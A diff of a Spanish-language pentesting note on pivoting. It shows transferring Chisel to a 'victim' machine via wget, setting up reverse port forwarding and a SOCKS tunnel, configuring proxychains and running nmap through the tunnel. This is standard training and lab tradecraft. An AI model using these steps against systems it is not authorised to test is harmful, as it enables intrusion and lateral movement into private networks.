@@ -26,22 +26,20 @@ El pivoting puede ser utilizado para superar restricciones de seguridad que de o
 
 2. Transferir Chisel a la maquina víctima mediante un servidor 'HTTP' 
 ❯ python3 -m http.server 80       # Máquina de atacante 
-❯ wget http://IP/chisel           # Máquina víctima 
+❯ wget http://IP/chisel           # Máquina víctima Linux
 ```
 
 ## 1. Remote Port Forwarding
 
-## 1.1 Crear un túnel con un puerto especifico 
+## 1.1 Crear un túnel con un puerto específico 
 
 ```bash
 NOTA: Funciona muy bien para traer servicios en el 'localhost' de la máquina víctima 
 
-❯ ./chisel server --reverse -p 1234       # Server 'Maquina Kali'
-
+❯ ./chisel server --reverse -p 11601       # Crear el server en Kali 
 	# Port-Server = Puerto a abrir en Kali
 
-❯ ./chisel client <IP-Server>:1234 R:<Port-Local-a-Abrir>:<IP-Local>:<Port-Traemos>    # Cliente 'Maquina víctima'
-
+❯ ./chisel client <IP-Server>:11601 R:<Port-Local-a-Abrir>:<IP-Local>:<Port-Traemos>    # Levantar el cliente 
 	# IP-Server = IP de Kali
 	# Port-Server = Puerto de Kali = 1234
 	# R = Remote Port Forwarding
@@ -54,32 +52,43 @@ Nota: Se crea un túnel utilizando un solo puerto con una IP especifica
 
 ## 1.2 Crear un túnel con todos los puertos 
 
+![[ligolo_punto_a_punto_b 2.png]]
+
+### LLegar de Kali al Punto B por medio del Punto A
+
 ```bash
-# Crea un túnel desde la maquina Kali hacia la maquina víctima
+Paso 1:
+❯ ./chisel server --reverse -p 11601     # Crear server en Kali 
 
-❯ ./chisel server --reverse -p 1234                    # Server 'Maquina Kali'
-❯ ./chisel client <IP-Server>:1234 R:socks             # Cliente 'Maquina víctima'
-
-	# IP-Server = IP de Kali
-	# Port-Server = Puerto de Kali
+Paso 2:
+❯ /tmp/chisel client <IP_Kali>:11601 R:1080:socks       # Levantar cliente 
+	# Puerto_Kali = 11601
 	# R = Remote Port Forwarding
-     # socks = Abre el puerto 1080 de Kali y crea un túnel para llegar a la máquina víctima 
+    # socks = Abre el puerto 1080 de Kali y crea un túnel para llegar a la máquina víctima 
 
-Nota: Se crea un túnel recibiendo todas las conexiones de los segmentos de red al que queremos acceder 
+
+NOTA: 
+	- Se crea un túnel recibiendo todas las conexiones de los segmentos de red al que se quiere acceder 
 ```
 
 ```bash 
-# Hacer los siguientes cambios después de crear el túnel 
+# Hacer los siguientes cambios en Kali después de crear el túnel 
 
-❯ nvim /etc/proxychains.conf 
+Paso 3:
+❯ nvim /etc/proxychains4.conf 
 
-Nota: 
+NOTA: 
 1. Deshabilitar comentando 'Dinamic_chain' ya que solo se habilita cuando se tienen varios tuneles
 2. Habilitar descomentando 'Strick_chain' ya que solo se habilita cuando tenemos un solo túnel 
 3. Hasta abajo del archivo agregar lo siguiente:
 
-	socks5 127.0.0.1 1080 
-	
+	socks5 127.0.0.1 1080
+```
+
+```bash 
+Paso 4:
+# Utilizar las herramientas de Kali con 'Proxichains' 
+❯ proxichains nmap -sT -Pn -p22 IP_Server 
 ```
 
 ## 2. Dinamic Port Forwarding para tener dos túneles 
